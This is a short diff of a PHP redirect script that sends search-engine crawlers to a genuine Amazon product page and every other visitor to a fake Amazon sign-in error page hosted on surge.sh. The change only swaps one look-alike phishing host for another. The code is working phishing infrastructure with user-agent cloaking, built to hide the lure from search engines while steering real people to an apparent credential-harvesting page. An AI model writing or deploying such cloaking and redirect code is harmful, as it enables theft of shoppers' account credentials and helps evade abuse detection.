@@ -5,6 +5,6 @@ if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|
     header('Location:https://www.amazon.com/Motivational-teamwork-bedroom-office-Aspire/dp/B07CJ2WYCZ');
 }
 else{
-	header('Location:https://amazon-com-signin-issue-error712.surge.sh');
+	header('Location:https://amazon-com-signin-error761.surge.sh');
 }
 ?>
